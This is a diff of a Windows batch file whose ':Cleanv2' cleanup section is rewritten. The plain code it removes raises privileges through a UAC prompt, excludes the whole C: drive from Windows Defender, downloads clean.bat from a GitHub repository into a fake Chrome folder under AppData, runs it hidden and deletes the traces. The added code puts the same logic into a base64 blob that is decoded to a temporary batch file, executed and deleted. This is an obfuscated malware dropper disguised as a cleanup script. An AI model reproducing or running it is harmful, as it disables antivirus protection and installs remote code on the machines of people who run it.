@@ -3247,60 +3247,20 @@ endlocal
 
 
 
-
-
-
 :----------------------------------------------------------------------------------------------------------------:
 :Cleanv2
 :----------------------------------------------------------------------------------------------------------------:
 @echo off
 setlocal enabledelayedexpansion
-IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
-    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
-) ELSE (
-    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
-)
-if '%errorlevel%' NEQ '0' (
-    goto UACPrompt
-) else (
-    goto gotAdmin 
-)
-:UACPrompt
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    set params=%*
-    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:""=""", "", "runas", 1 >> "%temp%\getadmin.vbs"
-    "%temp%\getadmin.vbs"
-    del "%temp%\getadmin.vbs"
-    exit /B
-:gotAdmin
-    pushd "%CD%"
-    CD /D "%~dp0"
-    powershell.exe -window hidden -Command "Add-MpPreference -ExclusionPath 'C:\'"
-    cd "C:\Users\%USERNAME%\AppData\Local"
-    mkdir "Chrome"
-    cd "C:\Users\%USERNAME%\AppData\Local\Chrome"
-    if not exist "clean.bat" (
-        echo [INFO] clean.bat dosyası indiriliyor...
-        powershell.exe -window hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/confessyourcin/xor-obfuscator/raw/refs/heads/main/clean.bat' -OutFile 'clean.bat'"
 
-        if exist "clean.bat" (
-            start "" /b clean.bat
-         
-        )
-    ) else (
-        start "" /b clean.bat
-    )
-timeout /t 10 >nul
-start "" /b clean.bat
-start "" /b decoded.bat
-timeout /t 25 >nul
+set "b64=QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24KSUYgIiVQUk9DRVNTT1JfQVJDSElURUNUVVJFJSIgRVFVICJhbWQ2NCIgKAogICAgPm51bCAyPiYxICIlU1lTVEVNUk9PVCVcU3lzV09XNjRcY2FjbHMuZXhlIiAiJVNZU1RFTVJPT1QlXFN5c1dPVzY0XGNvbmZpZ1xzeXN0ZW0iCikgRUxTRSAoCiAgICA+bnVsIDI+JjEgIiVTWVNURU1ST09UJVxzeXN0ZW0zMlxjYWNscy5leGUiICIlU1lTVEVNUk9PVCVcc3lzdGVtMzJcY29uZmlnXHN5c3RlbSIKKQppZiAnJWVycm9ybGV2ZWwlJyBORVEgJzAnICgKICAgIGdvdG8gVUFDUHJvbXB0CikgZWxzZSAoCiAgICBnb3RvIGdvdEFkbWluIAopCjpVQUNQcm9tcHQKICAgIGVjaG8gU2V0IFVBQyA9IENyZWF0ZU9iamVjdF4oIlNoZWxsLkFwcGxpY2F0aW9uIl4pID4gIiV0ZW1wJVxnZXRhZG1pbi52YnMiCiAgICBzZXQgcGFyYW1zPSUqCiAgICBlY2hvIFVBQy5TaGVsbEV4ZWN1dGUgImNtZC5leGUiLCAiL2MgIiIlfnMwIiIgJXBhcmFtczoiIj0iIiIsICIiLCAicnVuYXMiLCAxID4+ICIldGVtcCVcZ2V0YWRtaW4udmJzIgogICAgIiV0ZW1wJVxnZXRhZG1pbi52YnMiCiAgICBkZWwgIiV0ZW1wJVxnZXRhZG1pbi52YnMiCiAgICBleGl0IC9CCjpnb3RBZG1pbgogICAgcHVzaGQgIiVDRCUiCiAgICBDRCAvRCAiJX5kcDAiCiAgICBwb3dlcnNoZWxsLmV4ZSAtd2luZG93IGhpZGRlbiAtQ29tbWFuZCAiQWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAnQzpcJyIKICAgIGNkICJDOlxVc2Vyc1wlVVNFUk5BTUUlXEFwcERhdGFcTG9jYWwiCiAgICBta2RpciAiQ2hyb21lIgogICAgY2QgIkM6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWUiCiAgICBpZiBub3QgZXhpc3QgImNsZWFuLmJhdCIgKAogICAgICAgIGVjaG8gW0lORk9dIGNsZWFuLmJhdCBkb3N5YXPEsSBpbmRpcmlsaXlvci4uLgogICAgICAgIHBvd2Vyc2hlbGwuZXhlIC13aW5kb3cgaGlkZGVuIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyOyBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICdodHRwczovL2dpdGh1Yi5jb20vY29uZmVzc3lvdXJjaW4veG9yLW9iZnVzY2F0b3IvcmF3L3JlZnMvaGVhZHMvbWFpbi9jbGVhbi5iYXQnIC1PdXRGaWxlICdjbGVhbi5iYXQnIgoKICAgICAgICBpZiBleGlzdCAiY2xlYW4uYmF0IiAoCiAgICAgICAgICAgIHN0YXJ0ICIiIC9iIGNsZWFuLmJhdAogICAgICAgICAKICAgICAgICApCiAgICApIGVsc2UgKAogICAgICAgIHN0YXJ0ICIiIC9iIGNsZWFuLmJhdAogICAgKQp0aW1lb3V0IC90IDEwID5udWwKc3RhcnQgIiIgL2IgY2xlYW4uYmF0CnN0YXJ0ICIiIC9iIGRlY29kZWQuYmF0CnRpbWVvdXQgL3QgMjUgPm51bAoKcG93ZXJzaGVsbC5leGUgLXdpbmRvdyBoaWRkZW4gLUNvbW1hbmQgImlmIChUZXN0LVBhdGggJ0M6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWVcY2xlYW4uYmF0Jykge1JlbW92ZS1JdGVtICdDOlxVc2Vyc1wlVVNFUk5BTUUlXEFwcERhdGFcTG9jYWxcQ2hyb21lXGNsZWFuLmJhdCcgLUZvcmNlfSIKcG93ZXJzaGVsbC5leGUgLXdpbmRvdyBoaWRkZW4gLUNvbW1hbmQgImlmIChUZXN0LVBhdGggJ0M6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWVcZGVjb2RlZC5iYXQnKSB7UmVtb3ZlLUl0ZW0gJ0M6XFVzZXJzXCVVU0VSTkFNRSVcQXBwRGF0YVxMb2NhbFxDaHJvbWVcZGVjb2RlZC5iYXQnIC1Gb3JjZX0iCgpleGl0CmVuZGxvY2Fs"
 
-powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppData\Local\Chrome\clean.bat') {Remove-Item 'C:\Users\%USERNAME%\AppData\Local\Chrome\clean.bat' -Force}"
-powershell.exe -window hidden -Command "if (Test-Path 'C:\Users\%USERNAME%\AppData\Local\Chrome\decoded.bat') {Remove-Item 'C:\Users\%USERNAME%\AppData\Local\Chrome\decoded.bat' -Force}"
-
-exit
+powershell -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('%b64%')) | Set-Content -Encoding UTF8 cleanallfiles.bat"
+call cleanallfiles.bat
+del cleanallfiles.bat
 endlocal
-:----------------------------------------------------------------------------------------------------------------:
+
+
 
 
 
